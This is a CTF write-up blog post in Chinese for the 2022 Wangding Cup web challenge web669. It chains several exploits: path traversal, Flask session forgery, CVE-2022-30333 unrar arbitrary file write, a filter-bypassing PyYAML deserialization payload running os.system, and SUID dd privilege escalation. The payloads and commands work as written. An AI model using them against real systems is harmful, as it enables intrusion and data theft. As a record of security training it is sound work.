---
title: "2022 网鼎杯青龙组 Web 部分 Writeup"
date: 2022-08-26T20:03:48+08:00
lastmod: 2022-08-26T20:03:48+08:00
draft: false
author: "X1r0z"

tags: ['python','ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

web 三道题两道都是 java 呜呜呜

<!--more-->

## web669

application.py

```python
import os
import re
import yaml
import time
import socket
import subprocess
from hashlib import md5
from flask import Flask, render_template, make_response, send_file, request, redirect, session

app = Flask(__name__)
app.config['SECRET_KEY'] = socket.gethostname()

def response(content, status):
    resp = make_response(content, status)
    return resp


@app.before_request
def is_login():
    if request.path == "/upload":
        if session.get('user') != "Administrator":
            return f"<script>alert('Access Denied');window.location.href='/'</script>"
        else:
            return None


@app.route('/', methods=['GET'])
def main():
    if not session.get('user'):
        session['user'] = 'Guest'
    try:
        return render_template('index.html')
    except:
        return response("Not Found.", 404)
    finally:
        try:
            updir = 'static/uploads/' + md5(request.remote_addr.encode()).hexdigest()
            if not session.get('updir'):
                session['updir'] = updir
            if not os.path.exists(updir):
                os.makedirs(updir)
        except:
            return response('Internal Server Error.', 500)


@app.route('/<path:file>', methods=['GET'])
def download(file):
    if session.get('updir'):
        basedir = session.get('updir')
        try:
            path = os.path.join(basedir, file).replace('../', '')
            if os.path.isfile(path):
                return send_file(path)
            else:
                return response("Not Found.", 404)
        except:
            return response("Failed.", 500)


@app.route('/upload', methods=['GET', 'POST'])
def upload():

    if request.method == 'GET':
        return redirect('/')

    if request.method == 'POST':
        uploadFile = request.files['file']
        filename = request.files['file'].filename

        if re.search(r"\.\.|/", filename, re.M|re.I) != None:
            return "<script>alert('Hacker!');window.location.href='/upload'</script>"
        
        filepath = f"{session.get('updir')}/{md5(filename.encode()).hexdigest()}.rar"
        if os.path.exists(filepath):
            return f"<script>alert('The {filename} file has been uploaded');window.location.href='/display?file={filename}'</script>"
        else:
            uploadFile.save(filepath)
        
        extractdir = f"{session.get('updir')}/{filename.split('.')[0]}"
        if not os.path.exists(extractdir):
            os.makedirs(extractdir)

        pStatus = subprocess.Popen(["/usr/bin/unrar", "x", "-o+", filepath, extractdir])
        t_beginning = time.time()  
        seconds_passed = 0
        timeout=60
        while True:  
            if pStatus.poll() is not None:  
                break  
            seconds_passed = time.time() - t_beginning  
            if timeout and seconds_passed > timeout:  
                pStatus.terminate()  
                raise TimeoutError(cmd, timeout)
            time.sleep(0.1)

        rarDatas = {'filename': filename, 'dirs': [], 'files': []}
        
        for dirpath, dirnames, filenames in os.walk(extractdir):
            relative_dirpath = dirpath.split(extractdir)[-1]
            rarDatas['dirs'].append(relative_dirpath)
            for file in filenames:
                rarDatas['files'].append(os.path.join(relative_dirpath, file).split('./')[-1])

        with open(f'fileinfo/{md5(filename.encode()).hexdigest()}.yaml', 'w') as f:
            f.write(yaml.dump(rarDatas))

        return redirect(f'/display?file={filename}')


@app.route('/display', methods=['GET'])
def display():

    filename = request.args.get('file')
    if not filename:
        return response("Not Found.", 404)

    if os.path.exists(f'fileinfo/{md5(filename.encode()).hexdigest()}.yaml'):
        with open(f'fileinfo/{md5(filename.encode()).hexdigest()}.yaml', 'r') as f:
            yamlDatas = f.read()
            if not re.search(r"apply|process|out|system|exec|tuple|flag|\(|\)|\{|\}", yamlDatas, re.M|re.I):
                rarDatas = yaml.load(yamlDatas.strip().strip(b'\x00'.decode()))
                if rarDatas:
                    return render_template('result.html', filename=filename, path=filename.split('.')[0], files=rarDatas['files'])
                else:
                    return response('Internal Server Error.', 500)
            else:
                return response('Forbidden.', 403)
    else:
        return response("Not Found.", 404)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888)
```

主页

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208261607151.png)

上传文件显示 access denied

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208261608026.png)

源码中 is_login() 对身份进行了验证

```python
def is_login():
    if request.path == "/upload":
        if session.get('user') != "Administrator":
            return f"<script>alert('Access Denied');window.location.href='/'</script>"
        else:
            return None
```

猜测是 flask session 伪造, 要想成功伪造 session 必须要知道 session 数据的结构和 secret_key

前者不用 secrect_key 就能从一个已知的 cookie 解密出来

后者在源码中是这句 `app.config['SECRET_KEY'] = socket.gethostname()`

`socket.gethostname()` 返回主机名

因为网站是 `http://eci-2zeh8hn89fu4tuminjj1.cloudeci1.ichunqiu.com:8888/`, 所以尝试了一下 `eci-2zeh8hn89fu4tuminjj1`, `eci`, `cloudeci1`, 但都失败了

于是准备换个思路, 继续看源码

```python
@app.route('/<path:file>', methods=['GET'])
def download(file):
    if session.get('updir'):
        basedir = session.get('updir')
        try:
            path = os.path.join(basedir, file).replace('../', '')
            if os.path.isfile(path):
                return send_file(path)
            else:
                return response("Not Found.", 404)
        except:
            return response("Failed.", 500)
```

这里检测文件是否存在并且调用 send_file 读取文件

过滤逻辑是把 `../` 替换成空, 很明显可以通过双写绕过, 也是因为看见了这个过滤才准备试一试是否存在任意文件读取 (后来查看文章后发现 send_file 本身就存在这个漏洞)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208261616304.png)

读取文件不需要 Administrator 的 session, 这里用默认 Guest 的 session 就行

通过 /etc/hosts 读取主机名

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208261621254.png)

`10.16.40.73	engine-1`

伪造 session [https://github.com/noraj/flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager)

```bash
exp10it@LAPTOP-TBAF1QQG:~/Desktop/flask-session-cookie-manager$ python3 flask_session_cookie_manager3.py decode -c eyJ1cGRpciI6InN0YXRpYy91cGxvYWRzLzRiM2NmMWZmYzkyMjRmNGQ4MzBjNWEyOWRiODU0ZDE1IiwidXNlciI6Ikd1ZXN0In0.Ywgd9w.c7bQruQSda7SYv7ktblCfUjnUco
b'{"updir":"static/uploads/4b3cf1ffc9224f4d830c5a29db854d15","user":"Guest"}'
exp10it@LAPTOP-TBAF1QQG:~/Desktop/flask-session-cookie-manager$ python3 flask_session_cookie_manager3.py encode -t '{"updir":"static/uploads/4b3cf1ffc9224f4d830c5a29db854d15","user":"Administrator"}' -s "engine-1"
eyJ1cGRpciI6InN0YXRpYy91cGxvYWRzLzRiM2NmMWZmYzkyMjRmNGQ4MzBjNWEyOWRiODU0ZDE1IiwidXNlciI6IkFkbWluaXN0cmF0b3IifQ.YwiDBg.4Wjinu5nPVHPi45TBGIMvI6xwKE
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208261624505.png)

再看一下源码中的相关逻辑

```python
extractdir = f"{session.get('updir')}/{filename.split('.')[0]}"
if not os.path.exists(extractdir):
    os.makedirs(extractdir)

pStatus = subprocess.Popen(["/usr/bin/unrar", "x", "-o+", filepath, extractdir])
t_beginning = time.time()  
seconds_passed = 0
timeout=60
while True:  
    if pStatus.poll() is not None:  
        break  
    seconds_passed = time.time() - t_beginning  
    if timeout and seconds_passed > timeout:  
        pStatus.terminate()  
        raise TimeoutError(cmd, timeout)
    time.sleep(0.1)

rarDatas = {'filename': filename, 'dirs': [], 'files': []}

for dirpath, dirnames, filenames in os.walk(extractdir):
    relative_dirpath = dirpath.split(extractdir)[-1]
    rarDatas['dirs'].append(relative_dirpath)
    for file in filenames:
        rarDatas['files'].append(os.path.join(relative_dirpath, file).split('./')[-1])

with open(f'fileinfo/{md5(filename.encode()).hexdigest()}.yaml', 'w') as f:
    f.write(yaml.dump(rarDatas))

return redirect(f'/display?file={filename}')
```

上传成功后会调用 unrar 对压缩文件进行解压, 并且写入 yaml 数据到 fileinfo 文件夹内

先访问 /display 看看

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208261626563.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208261627619.png)

不过很显然这里的 /123/123.txt 不是真实路径, 因为 url 匹配的是 `/<path:file>` 这个路由

display 相关源码

```python
def display():

    filename = request.args.get('file')
    if not filename:
        return response("Not Found.", 404)

    if os.path.exists(f'fileinfo/{md5(filename.encode()).hexdigest()}.yaml'):
        with open(f'fileinfo/{md5(filename.encode()).hexdigest()}.yaml', 'r') as f:
            yamlDatas = f.read()
            if not re.search(r"apply|process|out|system|exec|tuple|flag|\(|\)|\{|\}", yamlDatas, re.M|re.I):
                rarDatas = yaml.load(yamlDatas.strip().strip(b'\x00'.decode()))
                if rarDatas:
                    return render_template('result.html', filename=filename, path=filename.split('.')[0], files=rarDatas['files'])
                else:
                    return response('Internal Server Error.', 500)
            else:
                return response('Forbidden.', 403)
    else:
        return response("Not Found.", 404)
```

读取 yaml 数据并返回结果, 读取之前有一个正则过滤 (一开始还没看出来这里为什么要过滤...)

因为是 flask 服务器, 上传 webshell 的传统思路肯定行不通

看到题目主页底下的 `EasyRar`, 想着可能从那一句 unrar 入手

```python
pStatus = subprocess.Popen(["/usr/bin/unrar", "x", "-o+", filepath, extractdir])
```

搜了一下 unrar 的漏洞, 发现有 CVE-2022-30333, 还是今年6月份爆出来的

参考文章 [https://www.ddosi.org/cve-2022-30333-poc/](https://www.ddosi.org/cve-2022-30333-poc/)

GitHub 上搜了一下 poc

[https://github.com/rbowes-r7/unrar-cve-2022-30333-poc](https://github.com/rbowes-r7/unrar-cve-2022-30333-poc)

```bash
exp10it@LAPTOP-TBAF1QQG:~/Desktop/unrar-cve-2022-30333-poc$ ruby cve-2022-30333.rb
Usage: ruby ./create-payload <../../target/file> <filename to read payload from>

Eg: $ ruby ./create-payload.rb '../../../../../../../../../../../opt/zimbra/jetty_base/webapps/zimbra/public/backdoor.jsp' ./reverse-tcp-4444.jsp
exp10it@LAPTOP-TBAF1QQG:~/Desktop/unrar-cve-2022-30333-poc$ echo helloworld > test.txt
exp10it@LAPTOP-TBAF1QQG:~/Desktop/unrar-cve-2022-30333-poc$ ruby cve-2022-30333.rb "../../../../../../../../../tmp/test.txt" ./test.txt > test.rar
```

上传之后再利用之前的任意文件读取

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208261641320.png)

成功读到 /tmp/test.txt, 也就说明存在这个漏洞

想了一会这个任意文件写入的漏洞, 有下面几个思路

1. 寻找 crontab 路径并写入脚本, 从而定时执行任意代码
2. 构造一个恶意的模板文件并覆写 flask templates 目录下原来的模板

第一种方法在读取文件的时候发现 /etc/crontab 并不存在

第二种方法就是构造类似 `{{ os.system('ls /') }}` 的模板, 覆盖掉原来的 index.html 或者 result.html (从源码来看只有这两个模板), 然后访问的时候加载我们自定义的模板来执行代码

但是实际测试的时候, **非 debug 模式**下的 flask 不会自动重新加载模板文件, 必须要手动重启才行

不能覆写 application.py 的原因同上

于是换了个思路, 想想该怎么利用这个文件读取

读取 /etc/passwd 的时候发现了 ctfer 用户, 试了一下 /home/ctfer 下的几个文件 `.bash_rc` `.bash_history` 等等都提示 file not found

nginx apache 这些服务器的配置文件也都没有

/proc/net/arp 里也没有信息, 应该是不存在内网?

然后读 /flag 的时候发现了不对劲的地方

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208261653298.png)

其它文件都是显示 file not found, 而这个显示的是 failed

回到源码来看

```python
try:
    path = os.path.join(basedir, file).replace('../', '')
    if os.path.isfile(path):
        return send_file(path)
    else:
        return response("Not Found.", 404)
except:
    return response("Failed.", 500)
```

捕获了异常再返回 500 错误, 猜测是权限不足

也就是说 /flag 凭我们目前 web 用户的权限是读不到的

网上尝试搜索关于 unrar 的提权漏洞, 并没有相关信息

思路一下子断了...

不过思考了一会又想起来之前 buu 做过 hctf 的一道题,  那道题里面的 flask 用的是一个旧版本的 twisted 库造成了 unicode 欺骗, 而库的版本是从 requirements.txt 里查看的

于是尝试读取 requirements.txt

读取之前注意下路径

```python
def download(file):
    if session.get('updir'):
        basedir = session.get('updir')
        try:
            path = os.path.join(basedir, file).replace('../', '')
            if os.path.isfile(path):
                return send_file(path)
            else:
                return response("Not Found.", 404)
        except:
            return response("Failed.", 500)
```

这里的 updir 类似于 `static/uploads/xx/` 一共三层

我们需要往上跳三层才能达到 flask 项目的主文件夹内

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208261707852.png)

其他版本查了下 PyPI 都是比较新的, 反倒是这个

```
PyYAML==5.3
```

最新版本是 6.0, 感觉不太对

搜了一下发现存在反序列化漏洞

[https://xz.aliyun.com/t/7923](https://xz.aliyun.com/t/7923)

[https://www.freebuf.com/vuls/256243.html](https://www.freebuf.com/vuls/256243.html)

[https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/](https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/)

5.3 已经高于 5.1 版本了, 很多 payload 都不能用

在第二篇文章里找到了一个本地测试能用的 payload

```python
- !!python/object/new:str
    args: []
    state: !!python/tuple
    - "print('test')"
    - !!python/object/new:staticmethod
      args: [0]
      state:
        update: !!python/name:exec
```

上传后显示 Forbidden, 原因如下

```python
if not re.search(r"apply|process|out|system|exec|tuple|flag|\(|\)|\{|\}", yamlDatas, re.M|re.I):
    rarDatas = yaml.load(yamlDatas.strip().strip(b'\x00'.decode()))
    if rarDatas:
        return render_template('result.html', filename=filename, path=filename.split('.')[0], files=rarDatas['files'])
    else:
        return response('Internal Server Error.', 500)
else:
    return response('Forbidden.', 403)
```

process system exec 过滤了还好说, 可以通过十六进制编码 + eval 绕过, 但是还过滤了 tuple

尝试把 tuple 换成 dict list, 执行失败

之前没接触过 yaml 反序列化的漏洞, 底层原理也云里雾里的

折腾了好久才发现之前一直放着没读完的第三篇文章里提了一下 tuple

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208261714950.png)

大概意思就是 frozenset bytes 这些类型也能够造成反序列化

复制了一下原文章里的 payload 然后修改一下 tuple 类型

```yaml
!!python/object/new:frozenset
- !!python/object/new:map
  - !!python/name:eval
  - ["__import__('os').system('ls / > /tmp/ls.txt')"]
```

字符串里的内容用十六进制编码绕过

```python
def enc(s):
    n = []
    for c in s:
        n.append(r'\x%2x' % ord(c))
    return ''.join(n)

text = "__import__('os').system('ls / > /tmp/ls.txt')"
print(enc(text))
```

最终 payload 如下

```yaml
!!python/object/new:frozenset
- !!python/object/new:map
  - !!python/name:eval
  - ["\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x20\x2f\x20\x3e\x20\x2f\x74\x6d\x70\x2f\x6c\x73\x2e\x74\x78\x74\x27\x29"]
```

保存为 yml 文件, 然后通过 unrar poc 构造 rar 文件

需要注意源码里的路径是 `fileinfo/{md5(filename.encode()).hexdigest()}.yaml`, 而 fileinfo 在 flask 项目文件夹下

上传后解压的文件夹在 `{session.get('updir')}/{filename.split('.')[0]}` 下, 类似于 `static/uploads/xx/123/`

所以构造的时候要先跳四层然后再进入 fileinfo

另外 `f'fileinfo/{md5(filename.encode()).hexdigest()}.yaml'` 指定了读取的 yml 文件的格式, 需要把文件名改成 md5

```bash
exp10it@LAPTOP-TBAF1QQG:~/Desktop/unrar-cve-2022-30333-poc$ ruby cve-2022-30333.rb '../../../../fileinfo/f3abb86bd34cf4d52698f14c0da1dc60.yaml' ./f3abb86bd34cf4d52698f14c0da1dc60.yaml > ls.rar
exp10it@LAPTOP-TBAF1QQG:~/Desktop/unrar-cve-2022-30333-poc$
```

其中 zzz 的 md5 值为 f3abb86bd34cf4d52698f14c0da1dc60

之后访问 `/display?file=zzz` 触发 yaml 反序列化

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208261744516.png)

读取 /tmp/ls.txt

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208261747282.png)

反弹 shell 一直失败, 不知道什么原因

start.sh 跟 flag 一样也读不出来, 估计是要提权?

查看系统版本

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208261748222.png)

Ubuntu 20.04 挺新的, 目前应该没有相关的 exp

于是去网上找找 linux 提权的其它思路

参考文章 [https://www.cnblogs.com/xiaozi/p/14264210.html](https://www.cnblogs.com/xiaozi/p/14264210.html)

发现有通过 SUID 提权的方法

```bash
find / -perm -u=s -type f 2>/dev/null
```

猜测 `find -exec` 可能能够执行命令? 不过还是试了一下

因为回显要输出到文件, 改一下重定向

```bash
find / -perm -u=s -type f 2>/dev/null 1>/tmp/find.txt
```

触发反序列化后读取 /tmp/find.txt

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208261755638.png)

并没有 find, 但是有 dd 命令, 平时没怎么见过, 应该是利用点

读写文件

```bash
dd if=/flag of=/tmp/flag.txt
```

稍微纠结了下获取了 SUID 权限之后生成 flag.txt 文件的权限是谁的...

结果发现成功读取到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208261801624.png)

## 补充

看到其它师傅 wp 中方法是通过更改 session 里面的 updir 来进行文件写入, 我这个应该算是有点非预期了

也有的师傅是覆写 result.html 直接进行 ssti, 原因应该是在第一次渲染 result.html 之前进行了覆写